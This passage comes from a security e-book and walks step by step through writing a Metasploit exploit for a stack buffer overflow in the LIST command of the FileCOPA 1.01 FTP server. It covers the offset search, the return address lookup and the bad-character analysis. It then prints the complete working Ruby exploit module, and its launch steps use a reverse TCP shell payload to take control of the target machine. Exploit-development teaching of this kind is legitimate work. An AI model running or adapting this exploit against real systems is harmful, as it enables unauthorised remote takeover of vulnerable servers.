      Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9<br class="calibre20"/>&#13;
      Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5<br class="calibre20"/>&#13;
      Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1<br class="calibre20"/>&#13;
      Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">We now open the <span><em class="italic">filecopa_exploit.rb</em></span> module and add the string located in <span><em class="italic">payload_test.txt</em></span> in place of the <code class="calibre19">'A'*1000</code>. The new line will look like this:<a class="calibre17" shape="rect"/></p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">buf =<br class="calibre20"/>&#13;
      'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac<br class="calibre20"/>&#13;
      5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af<br class="calibre20"/>&#13;
      1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah<br class="calibre20"/>&#13;
      7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak<br class="calibre20"/>&#13;
      3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am<br class="calibre20"/>&#13;
      9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap<br class="calibre20"/>&#13;
      5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As<br class="calibre20"/>&#13;
      1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au<br class="calibre20"/>&#13;
      7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax<br class="calibre20"/>&#13;
      3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az<br class="calibre20"/>&#13;
      9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc<br class="calibre20"/>&#13;
      5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf<br class="calibre20"/>&#13;
      1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh'</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">Save the updated <span><em class="italic">filecopa_exploit.rb</em></span> and return to the MSF window. To reload the edited module, click <span><strong class="calibre22">System ► Refresh</strong></span> in the GUI. Reset the applications by starting the FTP server and attaching OllyDbg. Run the module as described above, and you should see a different error message in OllyDbg. Instead of an access violation at <code class="calibre19">[41414141]</code>, there will now be an access violation at <code class="calibre19">[66413366]</code> (see <a class="calibre6" href="#filepos817346" shape="rect">Figure 10-3</a>).</p>&#13;
&#13;
    <div class="calibre20">&#13;
      <span class="italic"><a class="calibre17" shape="rect"/></span>&#13;
&#13;
      <div class="calibre3 calibre3" id="filepos817346">&#13;
        <span class="italic"><a class="calibre17" shape="rect"/><img alt="OllyDbg attached to FileCOPA showing an access violation" class="calibre23" src="../Images/00019.jpg"/></span>&#13;
      </div>&#13;
&#13;
      <p class="calibre4">Figure 10-3. OllyDbg attached to FileCOPA showing an access violation</p>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">We are making great progress! I hope you're beginning to see how easy MSF makes it to develop exploits. Take this new address and prepare to use another great MSF tool called <span><em class="italic">pattern_offset.rb</em></span>.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">As you may have guessed, this script will be able to tell us exactly how much space is used before the vulnerable stack space is called. Type the following command, passing the crashed address (<code class="calibre19">66413366</code>) and the length of the <span><em class="italic">payload_test.txt</em></span> string (<code class="calibre19">1000</code>):<a class="calibre17" shape="rect"/></p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">C:\Program Files\Metasploit\Framework3\framework\tools&gt;<strong class="calibre22"><code class="calibre19">ruby pattern_offset.rb 66413366<br class="calibre20"/>&#13;
       1000</code></strong></tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">The script responds with how much space needs to be filled before we write an address to jump to. In this example, the size of the offset was 160 bytes.</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">C:\Program Files\Metasploit\Framework3\framework\tools&gt;<strong class="calibre22"><code class="calibre19">ruby pattern_offset.rb 66413366<br class="calibre20"/>&#13;
      1000</code></strong><br class="calibre20"/>&#13;
      160</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">We need to provide an address to return or jump to so that we can execute our own code. Since <code class="calibre19">0x41414141</code> and <code class="calibre19">0x66413366</code> won't do anything for our exploit, we need to get a different address. I use the online <a class="calibre17" shape="rect"/>MSF Operation Code (<span><em class="italic">opcode</em></span>) database to get an address that allows us to execute our code. This website allows the user to search for a specific opcode for any operating system. For this example, I went to <a class="calibre6" href="http://www.metasploit.com/users/opcode/msfopcode.cgi/" shape="rect">http://www.metasploit.com/users/opcode/msfopcode.cgi/</a> (see <a class="calibre6" href="#filepos820404" shape="rect">Figure 10-4</a>).</p>&#13;
&#13;
    <div class="calibre20">&#13;
      <span class="italic"><a class="calibre17" shape="rect"/></span>&#13;
&#13;
      <div class="calibre3 calibre3" id="filepos820404">&#13;
        <span class="italic"><a class="calibre17" shape="rect"/><img alt="Metasploit Online Opcode Database" class="calibre23" src="../Images/00020.jpg"/></span>&#13;
      </div>&#13;
&#13;
      <p class="calibre4">Figure 10-4. Metasploit Online Opcode Database</p>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">I then clicked <span><strong class="calibre22">Search for opcodes in a set of modules</strong></span>.</p>&#13;
&#13;
    <p class="calibre4">I selected the <span><strong class="calibre22">Specific Opcode</strong></span> radio button and chose <span><strong class="calibre22">jmp esp</strong></span> from the drop-down menu.</p>&#13;
&#13;
    <p class="calibre4">A list of <span><em class="italic">.dll</em></span>s are shown, and the important thing to remember when <a class="calibre17" shape="rect"/>choosing a <span><em class="italic">.dll</em></span> is that you want it to be as generic, or common across as many platforms, as possible. The <span><em class="italic">uer32.dll</em></span> file is pretty generic, so that influenced my decision.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">I selected my target machine (Windows 2000 Service Pack 4 - English) and clicked <span><strong class="calibre22">Next</strong></span>.</p>&#13;
&#13;
    <p class="calibre4">The opcode database returned two addresses (<code class="calibre19">0x77e14c29</code> and <code class="calibre19">0x77e3c256</code>) that matched my criteria.</p>&#13;
&#13;
    <p class="calibre4">The exploit is almost complete, but we still need to craft the <code class="calibre19">LIST</code> command and remove all of the bad characters that will frustrate the exploit. Failure to remove the bad characters from our <a class="calibre17" shape="rect"/>payload will result in a failed exploit because our payload will be altered by the application.</p>&#13;
&#13;
    <p class="calibre4">To find the bad characters, we need to send all of the hexadecimal characters in the ASCII table and determine which ones are modified and corrupted during transmission. We modify the payload to contain <code class="calibre19">int3</code> (hex value <code class="calibre19">0xcc</code>) plus <code class="calibre19">0-255</code> repeated twice. The repetition of 0 through 255 narrows down what modified our character—was it a filter in the application trying to keep bad data out of the input buffer, or was it a method that used data as execution commands? Either way, we want our data to arrive untouched in the victim application's input buffer. If the character was modified in only one place, then presumably, a method altered our data. If two of the same characters are altered, then a filter probably intervened. The character string is easily generated using this command (the C argument specifies that the <code class="calibre19">pack</code> method uses unsigned chars):</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">buf  = "\xcc" + ([*(1..255)].pack ('C*') *2)</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">The following assignment to <code class="calibre19">buf</code> would have accomplished the same as the line above, but you can see how much smaller the line above is. I prefer the concise declarations.</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">buf = '\xcc\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\<br class="calibre20"/>&#13;
      x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\<br class="calibre20"/>&#13;
      x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\<br class="calibre20"/>&#13;
      x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\<br class="calibre20"/>&#13;
      x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\<br class="calibre20"/>&#13;
      x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\<br class="calibre20"/>&#13;
      x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\<br class="calibre20"/>&#13;
      x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\<br class="calibre20"/>&#13;
      x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\<br class="calibre20"/>&#13;
      xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\<br class="calibre20"/>&#13;
      xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\<br class="calibre20"/>&#13;
      xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\<br class="calibre20"/>&#13;
      xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\<br class="calibre20"/>&#13;
      xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff...'</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">When viewing the crashed FTP server in OllyDbg, we look for the input supplied by our module. The <code class="calibre19">\xcc</code> or <code class="calibre19">int3</code> is a software interrupt that causes OllyDbg to stop as if you had inserted a breakpoint in the code. At this point, we don't care about tracing the code; we just want to make sure our payload is solid. The interrupt pauses execution, allowing you to observe the characters sent by MSF to find which ones, if any, didn't make it through. If any of the characters are changed, manipulated, or otherwise different, then we remove them from the list.</p>&#13;
&#13;
    <p class="calibre4">You'll know which characters didn't survive because the stream was sequential, and there will be one character out of place if anything happened. This process is repeated because the stream will only reveal one bad character at a time. You have to repeat this process until your steam arrives intact. Once that happens, you will have found all of the bad characters. This time-consuming work will ensure the encoded <a class="calibre17" shape="rect"/>payload arrives properly. The bad characters are important when creating a <a class="calibre17" shape="rect"/>NOP sled (no operations that slide into our shellcode) as well as when encoding the payload. A <span><em class="italic">NOP sled</em></span> is a segment of code that results in no operations when executed. A simple "no operation" command would be <code class="calibre19">0x90</code>, which is computer operation code for "do nothing." Another example is to increment a register, then decrement the same register, resulting in an unchanged state.</p>&#13;
&#13;
    <div class="calibre20">&#13;
      <span class="italic"><a class="calibre17" shape="rect"/></span>&#13;
&#13;
      <div class="calibre3 calibre3" id="filepos827317">&#13;
        <span class="italic"><a class="calibre17" shape="rect"/><img alt="Tracking down bad characters" class="calibre23" src="../Images/00021.jpg"/></span>&#13;
      </div>&#13;
&#13;
      <p class="calibre4">Figure 10-5. Tracking down bad characters</p>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">You can see from <a class="calibre6" href="#filepos827317" shape="rect">Figure 10-5</a> that <code class="calibre19">\x0a</code> and <code class="calibre19">\x0d</code> are not included. The bad characters I found in this exploit are:</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">\x00\x0b\x0a\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">These are added to the module and assigned to <code class="calibre19">BadChars</code>. Now, we shift our attention to the <code class="calibre19">exploit</code> method and finish the module. Using a <a class="calibre17" shape="rect"/>fuzzer such as <a class="calibre17" shape="rect"/>SPIKE (an open source fuzzing <a class="calibre17" shape="rect"/>framework written by Dave <a class="calibre17" shape="rect"/>Aitel), you will find the vulnerability and the type of string used to crash the FTP server. The length of the string is important because it will reveal how much space we have to put in our payload. We can also look at the advisory for the proof of concept used to crash the application. The string will look similar to this:</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">LIST A BBBBBBBBBBBBBBBBBBBBBB...x 350...BBBBBBBBBB</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4"><a class="calibre17" shape="rect"/>Since there isn't enough space to insert our shellcode before the jump address, we need to modify our <code class="calibre19">buf</code> contents. The new attack string will look like this:<a class="calibre17" shape="rect"/></p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">buf  = "A\x20" + rand_text_english(160, <a class="calibre17" shape="rect"/>payload_badchars)<br class="calibre20"/>&#13;
      buf &lt;&lt; [target.ret].<a class="calibre17" shape="rect"/>pack('V')<br class="calibre20"/>&#13;
      buf &lt;&lt; <a class="calibre17" shape="rect"/>make_nops(4) + jmp_ecx<br class="calibre20"/>&#13;
      buf &lt;&lt; make_nops(444) + payload.encoded + "\r\n"</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">Breaking down each line, the <code class="calibre19">A\x20</code> represents the letter <span><em class="italic">A</em></span> followed by one space (<code class="calibre19">\x20</code> is the hexadecimal representation of a space). Then 160 bytes of random characters are appended as padding. This number came from the offset found by <span><em class="italic">pattern_offset.rb</em></span>. The method <code class="calibre19">payload_badchars</code> ensures that none of the bad characters will end up in the random data. The <a class="calibre17" shape="rect"/>return address is then added to the payload and converted to a usable address by the <code class="calibre19">pack</code> method. The <code class="calibre19">V</code> argument converts the return address to a specific binary sequence known as <span><em class="italic">little-endian</em></span> byte order.<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">After the return address, we add four NOPs to <code class="calibre19">buf</code>. The NOPs don't do anything other than fill the space. The difference between the <code class="calibre19">payload_badchars</code> and <code class="calibre19">make_nops</code> method is this: if <code class="calibre19">make_nops</code> is executed, it won't affect the exploit execution.</p>&#13;
&#13;
    <p class="calibre4">The next piece of the malicious string, <code class="calibre19">buf</code>, is tricky. Since there wasn't enough space before the return address to place a full-sized payload, we use a trick to jump to the payload. This is called a <span><em class="italic">shared library trampoline</em></span>. The basic idea is that instead of getting the instruction pointer to point to the payload address directly, we will look for our payload address in the registers and load the register's contents into the instruction pointer. All we need to ensure success is for the register to have an address pointing somewhere between the NOP sled and the start of our payload.<a class="calibre17" shape="rect"/></p>&#13;
&#13;
    <p class="calibre4">In this case, the address located in the ECX register will be pushed on the stack and then the <code class="calibre19">return</code> method will be called. The <code class="calibre19">return</code> function causes the payload address on the stack to be loaded into the instruction pointer and will result in our payload being executed. The transition from the FTP server execution to our payload is when we officially get control of the process. The exploit won't work unless this transition is perfect.</p>&#13;
&#13;
    <p class="calibre4">The last two pieces of our evil <code class="calibre19">LIST</code> argument are a sizeable NOP sled (444 characters in length) and the encoded payload. The whole string is terminated by a carriage return and newline feed which let the FTP server know we are done sending data. <code class="calibre19">buf</code> contains a very large string, but as you can see in the example code, it's broken up on each line.</p>&#13;
&#13;
    <p class="calibre4">To complete the exploit, our module sends the command <code class="calibre19">LIST</code> with our malicious string contained in <code class="calibre19">buf</code>. The results are a rooted Windows 2000 Service Pack 4 machine. If you have never used MSF, then the <code class="calibre19">reverse_shell</code> connection is a good payload with which to start. The payload tells the victim machine to send a command prompt to your address. The <code class="calibre19">handler</code> catches the session and allows you to have complete control over the machine. The other nice feature about a reverse connection is that, since the connection originates from within the victim's network, it easily bypasses a firewall. Now your module should look like this:<a class="calibre17" shape="rect"/></p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">require 'msf/core'<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
      module Msf<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
        class Exploits::Windows::Ftp::FileCopa_List &lt; Msf::Exploit::Remote<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          include Exploit::Remote::Ftp<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          def initialize(info = {})<br class="calibre20"/>&#13;
            super(update_info(info,   <br class="calibre20"/>&#13;
                'Name'           =&gt; 'FileCOPA 1.01 &lt;= List Overflow',<br class="calibre20"/>&#13;
                'Description'    =&gt; %q{This module exploits a stack overflow in the<br class="calibre20"/>&#13;
      FileCOPA multi-protocol file transfer service. A valid user account (or<br class="calibre20"/>&#13;
      anonymous access) is required for this exploit to work.<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                'Author'         =&gt; 'Steve &lt;Steve@nostarch.com&gt;',<br class="calibre20"/>&#13;
                'License'        =&gt; MSF_LICENSE,<br class="calibre20"/>&#13;
                'Version'        =&gt; '$Revision: 4498 $',<br class="calibre20"/>&#13;
                'References'   =&gt;<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                  ['OSVDB', '27389'],<br class="calibre20"/>&#13;
                ],<br class="calibre20"/>&#13;
                'Privileged'     =&gt; true,<br class="calibre20"/>&#13;
                'DefaultOptions' =&gt;<br class="calibre20"/>&#13;
                  {<br class="calibre20"/>&#13;
                  'EXITFUNC' =&gt; 'thread',<br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                '<a class="calibre17" shape="rect"/>Payload'        =&gt;<br class="calibre20"/>&#13;
                  {<br class="calibre20"/>&#13;
                  'Space'    =&gt; 1000,<br class="calibre20"/>&#13;
                  'BadChars' =&gt; "\x00",<br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                'Targets'        =&gt;<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                    'Windows 2000 Professional SP4 English',<br class="calibre20"/>&#13;
                    {<br class="calibre20"/>&#13;
                      'Platform' =&gt; 'win',<br class="calibre20"/>&#13;
                      'Ret'      =&gt; 0XDEADBEEF,<br class="calibre20"/>&#13;
                    },<br class="calibre20"/>&#13;
                  ],<br class="calibre20"/>&#13;
                ]))<br class="calibre20"/>&#13;
          end<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          def exploit<br class="calibre20"/>&#13;
            connect_login<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            print_status("Trying target #{target.name}...")<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            jmp_ecx = "\x66\x81\xc1\xa0\x01\x51\xc3"<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            buf  = "A\x20" + rand_text_english(160, <a class="calibre17" shape="rect"/>payload_badchars)<br class="calibre20"/>&#13;
            buf &lt;&lt; [<a class="calibre17" shape="rect"/>target.ret].pack('V')<br class="calibre20"/>&#13;
            buf &lt;&lt; make_nops(4) + jmp_ecx<br class="calibre20"/>&#13;
      buf &lt;&lt; make_nops(444) + payload.encoded + "\r\n"<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            send_cmd( ['LIST', buf] , false)<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            handler<br class="calibre20"/>&#13;
            disconnect<br class="calibre20"/>&#13;
          end<br class="calibre20"/>&#13;
        endend</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">There are some features <a class="calibre17" shape="rect"/>of MSF that can help polish up the exploit process a bit. We are going to add another method called <code class="calibre19">check</code> to the module in between <code class="calibre19">initialize</code> and <code class="calibre19">exploit</code>. This method will determine whether a target is vulnerable to this exploit by analyzing the <a class="calibre17" shape="rect"/>banner. To do this, we'd have to know what the banner of a vulnerable system looks like. A word of caution: If the system administrator changed the banner, then this check won't work. Since most banners are left intact, this generally streamlines the target validation process.</p>&#13;
&#13;
    <p class="calibre4">The module will connect to port 21 on the target machine, grab the banner, and then disconnect. If the banner contains <span><em class="italic">FileCOPA FTP Server Version 1.01</em></span>, we know the target is vulnerable. If the banner check fails, then we may want to look for another attack vector, or we can try the exploit anyway. The code for the check method is shown below:</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">def check<br class="calibre20"/>&#13;
          connect<br class="calibre20"/>&#13;
          disconnect<br class="calibre20"/>&#13;
          if (banner =~ /FileCOPA FTP Server Version 1\.01/)<br class="calibre20"/>&#13;
              return Exploit::CheckCode::Vulnerable<br class="calibre20"/>&#13;
          end<br class="calibre20"/>&#13;
          return Exploit::CheckCode::Safe<br class="calibre20"/>&#13;
      end</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">Now putting all of the MSF module code together, you get a fully functioning exploit:</p><a class="calibre17" shape="rect"/>&#13;
&#13;
    <div class="calibre3">&#13;
      <span class="calibre18"><tt class="calibre19">require 'msf/core'<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
      module Msf<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
        class Exploits::Windows::Ftp::FileCopa_List &lt; Msf::Exploit::Remote<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          include Exploit::Remote::Ftp<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          def initialize(info = {})<br class="calibre20"/>&#13;
            super(update_info(info,<br class="calibre20"/>&#13;
                'Name'           =&gt; 'FileCOPA 1.01 &lt;= List Overflow',<br class="calibre20"/>&#13;
                'Description'    =&gt; %q{This module exploits a stack overflow in the<br class="calibre20"/>&#13;
      FileCOPA multi-protocol file transfer service. A valid user account (or anonymous<br class="calibre20"/>&#13;
      access) is required for this exploit to work.<br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                'Author'         =&gt; 'Steve &lt;Steve@nostarch.com&gt;',<br class="calibre20"/>&#13;
                'License'        =&gt; MSF_LICENSE,<br class="calibre20"/>&#13;
                'Version'        =&gt; '$Revision: 4498 $',<br class="calibre20"/>&#13;
                'References'   =&gt;<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                  ['OSVDB', '27389'],<br class="calibre20"/>&#13;
                ],<br class="calibre20"/>&#13;
                'Privileged'     =&gt; true,<br class="calibre20"/>&#13;
                'DefaultOptions' =&gt;<br class="calibre20"/>&#13;
                  {<br class="calibre20"/>&#13;
                  'EXITFUNC' =&gt; 'thread',<br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                '<a class="calibre17" shape="rect"/>Payload'        =&gt;<br class="calibre20"/>&#13;
                  {<br class="calibre20"/>&#13;
                  'Space'    =&gt; 400,<br class="calibre20"/>&#13;
                  'BadChars' =&gt; "\x00\x0b\x0a\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c",<br class="calibre20"/>&#13;
                  'SaveRegisters' =&gt; ['ecx'],<br class="calibre20"/>&#13;
                },<br class="calibre20"/>&#13;
                'Targets'        =&gt;<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                  [<br class="calibre20"/>&#13;
                    'Windows 2000 Professional SP4 English',<br class="calibre20"/>&#13;
                    {<br class="calibre20"/>&#13;
                      'Platform' =&gt; 'win',<br class="calibre20"/>&#13;
                      'Ret'      =&gt; 0x77E14C29,<br class="calibre20"/>&#13;
                    },<br class="calibre20"/>&#13;
                  ],<br class="calibre20"/>&#13;
                ]))<br class="calibre20"/>&#13;
          end<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          def check<br class="calibre20"/>&#13;
            connect<br class="calibre20"/>&#13;
            disconnect<br class="calibre20"/>&#13;
            if (banner =~ /FileCOPA FTP Server Version 1\.01/)<br class="calibre20"/>&#13;
              return Exploit::CheckCode::Vulnerable<br class="calibre20"/>&#13;
            end<br class="calibre20"/>&#13;
            return Exploit::CheckCode::Safe<br class="calibre20"/>&#13;
          end<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
          def exploit<br class="calibre20"/>&#13;
            connect_login<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            print_status("Trying target #{target.name}...")<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            jmp_ecx = "\x66\x81\xc1\xa0\x01\x51\xc3"<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            buf  = "A\x20" + rand_text_english(160, payload_badchars)<br class="calibre20"/>&#13;
            buf &lt;&lt; [target.ret].pack('V')<br class="calibre20"/>&#13;
            buf &lt;&lt; make_nops(4) + jmp_ecx<br class="calibre20"/>&#13;
      buf &lt;&lt; make_nops(444) + payload.encoded + "\r\n"<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            send_cmd( ['LIST', buf] , false)<br class="calibre20"/>&#13;
      <br class="calibre20"/>&#13;
            handler<br class="calibre20"/>&#13;
            disconnect<br class="calibre20"/>&#13;
          end<br class="calibre20"/>&#13;
        end<br class="calibre20"/>&#13;
      end</tt></span>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">That completes the exploit. All that is left to do is test it out. So restart the FTP server on the victim machine, and reload the <code class="calibre19">FileCOPA</code> module on your attack machine. A quick rundown of the steps is listed below:</p>&#13;
&#13;
    <div class="calibre3">&#13;
      <ol class="calibre36">&#13;
        <li class="calibre37" value="1">Search for <span><em class="italic">FileCOPA</em></span> in the MSF GUI.</li>&#13;
&#13;
        <li class="calibre37" value="2">Double-click the <span><strong class="calibre22">FileCOPA LIST Exploit</strong></span>.</li>&#13;
&#13;
        <li class="calibre37" value="3">A new window will pop up.</li>&#13;
&#13;
        <li class="calibre37" value="4">Choose the correct target from the drop-down menu: <span><strong class="calibre22">Windows 2k Server SP4 English</strong></span>.</li>&#13;
&#13;
        <li class="calibre37" value="5">Choose a payload: <span><strong class="calibre22">generic/shell_reverse_tcp</strong></span>.</li>&#13;
&#13;
        <li class="calibre37" value="6">You'll need to add <code class="calibre19">RHOST</code>, which is the remote host, and <code class="calibre19">LHOST</code>, the local host.</li>&#13;
&#13;
        <li class="calibre37" value="7">Click <span><strong class="calibre22">Apply</strong></span>—this will launch the exploit.</li>&#13;
&#13;
        <li class="calibre37" value="8">The window will close, and a new job will be displayed in the Jobs pane.</li>&#13;
&#13;
        <li class="calibre37" value="9">If the exploit was successful, you will have a new session in the Session pane.</li>&#13;
&#13;
        <li class="calibre37" value="10">To see what happened after you hit Apply, click the <span><strong class="calibre22">Module Output</strong></span> tab in the lower-left pane.</li>&#13;
      </ol>&#13;
    </div>&#13;
&#13;
    <p class="calibre4">Now you have a shell, and we get to the "managing phase" mentioned at the beginning of the chapter. This example went pretty quickly, and I've always found exploiting systems on my own more time consuming than when following along with an example. If you decide to try these techniques on your own, remember to have patience. This is a game of perpetual learning, so don't forget to enjoy the journey. Happy hacking! ;-)<a class="calibre17" shape="rect"/><a class="calibre17" shape="rect"/></p>&#13;
  </div>&#13;
&#13;
  <div class="mbppagebreak" id="calibre_pb_494"/>&#13;
</body></html>